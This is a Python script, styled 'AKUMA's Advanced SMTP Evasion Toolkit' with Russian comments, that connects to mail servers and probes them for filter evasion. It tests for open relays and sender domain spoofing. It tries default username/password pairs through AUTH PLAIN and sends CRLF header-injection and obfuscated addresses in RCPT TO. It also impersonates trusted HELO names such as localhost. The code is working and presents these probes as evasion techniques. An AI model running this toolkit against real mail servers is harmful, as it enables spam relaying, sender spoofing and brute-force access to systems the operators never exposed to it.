#!/usr/bin/env python3
"""
AKUMA's Advanced SMTP Evasion Toolkit 💀
Продвинутые техники обхода SMTP фильтров и защиты
Для когда стандартных проверок недостаточно!
"""

import socket
import time
import random
import string
import base64
from typing import List, Dict, Any

class SMTPEvasionTester:
    def __init__(self, timeout=15):
        self.timeout = timeout
        
        # Различные домены для тестирования
        self.test_domains = [
            "gmail.com", "yahoo.com", "hotmail.com", "outlook.com",
            "mail.ru", "yandex.ru", "test.com", "example.com",
            "tempmail.com", "10minutemail.com"
        ]
        
        # Различные EHLO/HELO имена
        self.helo_names = [
            "mail.security-test.com",
            "localhost",
            "127.0.0.1",
            "[192.168.1.1]",
            "internal.local",
            "mx.company.com",
            "relay.trusted.net"
        ]
    
    def generate_random_email(self, domain=None):
        """Генерируем случайный email"""
        if not domain:
            domain = random.choice(self.test_domains)
        
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"{username}@{domain}"
    
    def test_basic_relay(self, sock, target_domain):
        """Базовое тестирование relay"""
        test_cases = [
            # Стандартные кейсы
            (self.generate_random_email(), self.generate_random_email()),
            (f"test@{target_domain}", self.generate_random_email()),
            (self.generate_random_email(), f"test@{target_domain}"),
            
            # Пустые и специальные адреса
            ("", self.generate_random_email()),
            ("<>", self.generate_random_email()),
            ("postmaster", self.generate_random_email()),
            ("mailer-daemon", self.generate_random_email()),
        ]
        
        results = []
        
        for from_addr, to_addr in test_cases:
            result = self._test_mail_transaction(sock, from_addr, to_addr)
            if result['success']:
                results.append({
                    'technique': 'basic_relay',
                    'from': from_addr,
                    'to': to_addr,
                    'response': result['response']
                })
        
        return results
    
    def test_domain_spoofing(self, sock, target_domain):
        """Тестирование спуфинга домена"""
        results = []
        
        spoofed_domains = [
            f"mail.{target_domain}",
            f"smtp.{target_domain}",
            f"relay.{target_domain}",
            f"{target_domain}.com",
            f"sub.{target_domain}",
            target_domain.replace('.com', '.net'),
            target_domain.replace('.com', '.org'),
        ]
        
        for spoofed in spoofed_domains:
            from_addr = f"admin@{spoofed}"
            to_addr = self.generate_random_email()
            
            result = self._test_mail_transaction(sock, from_addr, to_addr)
            if result['success']:
                results.append({
                    'technique': 'domain_spoofing',
                    'spoofed_domain': spoofed,
                    'from': from_addr,
                    'to': to_addr,
                    'response': result['response']
                })
        
        return results
    
    def test_auth_bypass(self, sock):
        """Попытки обхода аутентификации"""
        results = []
        
        # Пробуем слабые креды
        weak_creds = [
            ("admin", "admin"),
            ("test", "test"),
            ("smtp", "smtp"),
            ("mail", "mail"),
            ("user", "password"),
            ("", ""),
        ]
        
        for username, password in weak_creds:
            try:
                # AUTH PLAIN
                auth_string = base64.b64encode(f"\x00{username}\x00{password}".encode()).decode()
                sock.send(f"AUTH PLAIN {auth_string}\r\n".encode())
                time.sleep(1)
                response = sock.recv(1024).decode('utf-8', errors='ignore')
                
                if '235' in response:  # Authentication successful
                    results.append({
                        'technique': 'auth_bypass',
                        'username': username,
                        'password': password,
                        'response': response.strip()
                    })
                    break
            except Exception:
                continue
        
        return results
    
    def test_header_injection(self, sock, target_domain):
        """Тестирование инъекций в заголовки"""
        results = []
        
        injection_payloads = [
            f"test@{target_domain}\r\nX-Injected: true",
            f"test@{target_domain} (injected comment)",
            f"\"test\"@{target_domain}",
            f"test+injection@{target_domain}",
            f"test@[{target_domain}]",
        ]
        
        for payload in injection_payloads:
            from_addr = self.generate_random_email()
            
            result = self._test_mail_transaction(sock, from_addr, payload)
            if result['success']:
                results.append({
                    'technique': 'header_injection',
                    'payload': payload,
                    'from': from_addr,
                    'to': payload,
                    'response': result['response']
                })
        
        return results
    
    def test_address_obfuscation(self, sock, target_domain):
        """Тестирование обфускации адресов"""
        results = []
        
        obfuscation_techniques = [
            # Различные форматы адресов
            f"<test@{target_domain}>",
            f"test@{target_domain} (Real Name)",
            f"\"test\"@{target_domain}",
            f"test+tag@{target_domain}",
            f"test.dot@{target_domain}",
            
            # IP адреса вместо доменов
            "test@[127.0.0.1]",
            "test@[::1]",
            "test@192.168.1.1",
            
            # URL encoding
            f"test%40{target_domain}",
            f"test@{target_domain.replace('.', '%2E')}",
        ]
        
        for obfuscated_to in obfuscation_techniques:
            from_addr = self.generate_random_email()
            
            result = self._test_mail_transaction(sock, from_addr, obfuscated_to)
            if result['success']:
                results.append({
                    'technique': 'address_obfuscation',
                    'obfuscated_address': obfuscated_to,
                    'from': from_addr,
                    'to': obfuscated_to,
                    'response': result['response']
                })
        
        return results
    
    def test_different_helo(self, host, port, target_domain):
        """Тестирование с различными HELO/EHLO именами"""
        results = []
        
        for helo_name in self.helo_names:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((host, port))
                
                # Читаем баннер
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                
                # Пробуем с разными HELO
                sock.send(f"HELO {helo_name}\r\n".encode())
                time.sleep(1)
                helo_response = sock.recv(1024).decode('utf-8', errors='ignore')
                
                if '250' in helo_response:
                    # Тестируем relay с этим HELO
                    from_addr = self.generate_random_email()
                    to_addr = self.generate_random_email()
                    
                    result = self._test_mail_transaction(sock, from_addr, to_addr)
                    if result['success']:
                        results.append({
                            'technique': 'helo_variation',
                            'helo_name': helo_name,
                            'from': from_addr,
                            'to': to_addr,
                            'response': result['response']
                        })
                
                sock.send(b"QUIT\r\n")
                sock.close()
                
            except Exception as e:
                continue
        
        return results
    
    def _test_mail_transaction(self, sock, from_addr, to_addr):
        """Выполняем полную MAIL FROM / RCPT TO транзакцию"""
        try:
            # MAIL FROM
            if from_addr in ["", "<>"]:
                cmd = "MAIL FROM:<>\r\n"
            else:
                cmd = f"MAIL FROM:<{from_addr}>\r\n"
            
            sock.send(cmd.encode())
            time.sleep(0.5)
            mail_response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            if '250' in mail_response:
                # RCPT TO
                sock.send(f"RCPT TO:<{to_addr}>\r\n".encode())
                time.sleep(0.5)
                rcpt_response = sock.recv(1024).decode('utf-8', errors='ignore')
                
                if '250' in rcpt_response:
                    return {
                        'success': True,
                        'response': rcpt_response.strip()
                    }
            
            return {'success': False}
            
        except Exception:
            return {'success': False}
    
    def comprehensive_test(self, host, port, domain):
        """Комплексное тестирование всех техник"""
        print(f"\n[+] Starting comprehensive SMTP evasion test for {domain} ({host}:{port})")
        
        all_results = []
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((host, port))
            
            # Читаем баннер
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            print(f"[*] Banner: {banner.strip()}")
            
            # EHLO
            sock.send(b"EHLO security-evasion-test.com\r\n")
            time.sleep(1)
            ehlo_response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            if '250' in ehlo_response:
                print("[+] EHLO successful, testing evasion techniques...")
                
                # Запускаем все тесты
                techniques = [
                    ('Basic Relay', self.test_basic_relay(sock, domain)),
                    ('Domain Spoofing', self.test_domain_spoofing(sock, domain)),
                    ('Auth Bypass', self.test_auth_bypass(sock)),
                    ('Header Injection', self.test_header_injection(sock, domain)),
                    ('Address Obfuscation', self.test_address_obfuscation(sock, domain)),
                ]
                
                for technique_name, technique_results in techniques:
                    if technique_results:
                        print(f"    🔥 {technique_name}: {len(technique_results)} vulnerabilities found")
                        all_results.extend(technique_results)
                    else:
                        print(f"    ❌ {technique_name}: No vulnerabilities")
            
            sock.send(b"QUIT\r\n")
            sock.close()
            
            # Тестируем разные HELO имена (отдельные соединения)
            helo_results = self.test_different_helo(host, port, domain)
            if helo_results:
                print(f"    🔥 HELO Variations: {len(helo_results)} vulnerabilities found")
                all_results.extend(helo_results)
            else:
                print(f"    ❌ HELO Variations: No vulnerabilities")
            
        except Exception as e:
            print(f"[-] Connection error: {e}")
            return []
        
        return all_results

def main():
    """Пример использования"""
    tester = SMTPEvasionTester()
    
    # Тестирование одного сервера
    results = tester.comprehensive_test("mail.example.com", 25, "example.com")
    
    if results:
        print("\n🚨 EVASION VULNERABILITIES FOUND:")
        print("=" * 50)
        for result in results:
            print(f"Technique: {result['technique']}")
            print(f"From: {result['from']}")
            print(f"To: {result['to']}")
            print(f"Response: {result['response']}")
            print("-" * 30)
    else:
        print("\n✅ No evasion vulnerabilities detected")

if __name__ == "__main__":
    main()
